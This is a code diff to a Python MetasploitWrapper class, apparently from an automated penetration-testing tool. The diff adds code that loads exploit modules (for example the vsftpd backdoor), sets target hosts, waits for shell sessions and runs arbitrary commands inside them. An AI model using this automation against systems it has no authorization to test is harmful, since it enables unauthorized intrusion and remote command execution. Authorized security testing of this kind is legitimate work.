@@ -294,40 +294,98 @@ class MetasploitWrapper:
         print(f"💾 Saved module: {service_signature} → {module} "
               f"({entry['success_count']} successes, reliability: {entry['reliability']})")
     
-    def run_exploit(self, module_path: str, options: Dict) -> Dict:
+    def run_exploit(self, module_path: str, options: Dict, payload: str = 'cmd/unix/interact') -> Dict:
         """
         Execute a Metasploit module.
+        
+        Args:
+            module_path: Path to the Metasploit module (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor')
+            options: Dictionary of module options (RHOSTS, RPORT, etc.)
+            payload: Payload to use (default: 'cmd/unix/interact')
+            
+        Returns:
+            Dict with success status, session_id, and output
         """
         if not self.client:
             return {'success': False, 'error': 'Metasploit not connected'}
             
         try:
-            exploit = self.client.modules.use('exploit', module_path)
+            # Determine if this is an exploit or auxiliary module
+            module_type = 'exploit' if 'exploit/' in module_path else 'auxiliary'
+            
+            print(f"    🔧 Loading {module_type}: {module_path}")
+            exploit = self.client.modules.use(module_type, module_path)
+            
+            if not exploit:
+                return {'success': False, 'error': f'Failed to load module: {module_path}'}
             
             # Set options
+            print(f"    ⚙️  Configuring options...")
             for key, value in options.items():
                 if key in exploit.options:
                     exploit[key] = value
+                    print(f"       • {key} = {value}")
             
             # Execute
-            print(f"🚀 Executing MSF module: {module_path}")
-            job = exploit.execute(payload='cmd/unix/interact')
+            print(f"    🚀 Executing with payload: {payload}")
             
-            # Wait for result (simplified for now)
-            # In a real scenario, we'd poll the job status and session list
+            # Store pre-execution session count
+            pre_sessions = set(self.client.sessions.list.keys()) if hasattr(self.client.sessions.list, 'keys') else set()
             
-            # Check for sessions
-            sessions = self.client.sessions.list
-            if sessions:
-                # Assuming the last session is ours
-                session_id = list(sessions.keys())[-1]
-                print(f"✅ Session opened: {session_id}")
-                return {'success': True, 'session_id': session_id, 'output': 'Session opened'}
+            # Execute the exploit
+            if module_type == 'exploit':
+                job = exploit.execute(payload=payload)
             else:
-                return {'success': False, 'error': 'No session created'}
+                # Auxiliary modules don't have payloads
+                job = exploit.execute()
+            
+            # Wait for session creation (up to 10 seconds)
+            import time
+            max_wait = 10
+            wait_interval = 0.5
+            elapsed = 0
+            
+            print(f"    ⏳ Waiting for session (max {max_wait}s)...")
+            
+            while elapsed < max_wait:
+                time.sleep(wait_interval)
+                elapsed += wait_interval
+                
+                # Check for new sessions
+                current_sessions = self.client.sessions.list
+                if current_sessions:
+                    post_sessions = set(current_sessions.keys())
+                    new_sessions = post_sessions - pre_sessions
+                    
+                    if new_sessions:
+                        # Get the newest session
+                        session_id = list(new_sessions)[0]
+                        print(f"    ✅ Session opened: {session_id}")
+                        
+                        # Get session info
+                        session_info = current_sessions[session_id]
+                        session_type = session_info.get('type', 'unknown')
+                        target_host = session_info.get('target_host', 'unknown')
+                        
+                        return {
+                            'success': True,
+                            'session_id': session_id,
+                            'session_type': session_type,
+                            'target_host': target_host,
+                            'output': f'Session {session_id} opened on {target_host}'
+                        }
+            
+            # Timeout - no session created
+            print(f"    ⚠️  No session created within {max_wait}s")
+            return {
+                'success': False,
+                'error': 'Exploit executed but no session created (may have succeeded without callback)'
+            }
                 
         except Exception as e:
-            print(f"❌ MSF execution failed: {e}")
+            print(f"    ❌ MSF execution failed: {e}")
+            import traceback
+            traceback.print_exc()
             return {'success': False, 'error': str(e)}
     
     def _connect(self, msf_config):
@@ -339,6 +397,47 @@ class MetasploitWrapper:
             ssl=msf_config['rpc_ssl']
         )
 
+    def interact_with_session(self, session_id: str, commands: List[str]) -> Dict[str, str]:
+        """
+        Run commands in a Metasploit session and collect output.
+        
+        Args:
+            session_id: The session ID to interact with
+            commands: List of commands to execute
+            
+        Returns:
+            Dictionary mapping command to output
+        """
+        if not self.client:
+            return {}
+        
+        results = {}
+        
+        try:
+            session = self.client.sessions.session(session_id)
+            
+            import time
+            for cmd in commands:
+                try:
+                    # Send command
+                    session.write(cmd + "\n")
+                    
+                    # Wait for output
+                    time.sleep(1)
+                    
+                    # Read output
+                    output = session.read()
+                    results[cmd] = output if output else "[No output]"
+                    
+                except Exception as e:
+                    results[cmd] = f"[Error: {e}]"
+            
+            return results
+            
+        except Exception as e:
+            print(f"    ⚠️  Session interaction failed: {e}")
+            return {}
+    
     def _start_rpc_server(self, msf_config) -> bool:
         """Attempt to start msfrpcd"""
         try:
